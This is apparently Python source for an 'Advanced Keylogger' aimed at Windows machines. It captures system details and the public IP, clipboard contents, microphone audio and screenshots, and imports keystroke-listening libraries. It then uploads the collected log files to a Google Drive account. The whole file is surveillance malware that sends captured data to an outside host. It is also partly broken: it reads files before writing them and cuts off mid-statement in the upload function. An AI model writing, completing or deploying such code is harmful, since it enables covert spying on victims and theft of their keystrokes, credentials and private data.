import getpass
import platform
import socket
import time
import keyboard
import sounddevice as sd
import wavio as wv
import win32clipboard
from PIL import ImageGrab
from requests import get
from pynput.keyboard import Key, Listener
import glob, os

# Gdrive_Setup
from pydrive.auth import GoogleAuth
from pydrive.drive import GoogleDrive
#Login to Google Drive and create drive object
g_login = GoogleAuth()
g_login.LocalWebserverAuth()
drive = GoogleDrive(g_login)

# Set file paths for log files
keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

# Set parameters for microphone and iterations
microphone_time = 10
time_iteration = 15
number_of_iterations = 0
number_of_iterations_end = 3

# Set file path for log files
file_path = "D:\Advanced Keylogger"
extend = "\\"
file_merge = file_path + extend

#for system info 
def computer_information():
    # Write system information to file
    with open(file_path + extend + system_information, "w+") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

# Read system information from file
with open(file_path+'\systeminfo.txt','r+') as si:
    filedata_si = si.read()
    si.close()

#for clipboard
def copy_clipboard():
    # Write clipboard information to file
    with open(file_path + extend + clipboard_information, "w+") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")

# Read clipboard information from file
with open(file_path+'\clipboard.txt','r+') as cb:
    filedata_cb = cb.read()
    cb.close()

#for mic
def microphone():
    # Record audio for a specified duration and write to file
    freq = 44100
    duration = 10
    recording = sd.rec(int(duration * freq),samplerate=freq, channels=2)
    sd.wait()
    wv.write("audio.wav", recording, freq, sampwidth=2)

# get screenshots
def screenshot():
    # Take a screenshot and save to file
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

def uploadFile():
    # Upload files to Google Drive
    upload_file_list = ['systeminfo.txt', 'key_log.txt', 'clipboard.txt']
    for upload_file in upload_file_list:
        with open(upload_file, "r") as f:
            fn = os.path.basename(f.name)
            file_drive = drive.CreateFile({'title': fn})
            file_drive.SetContent
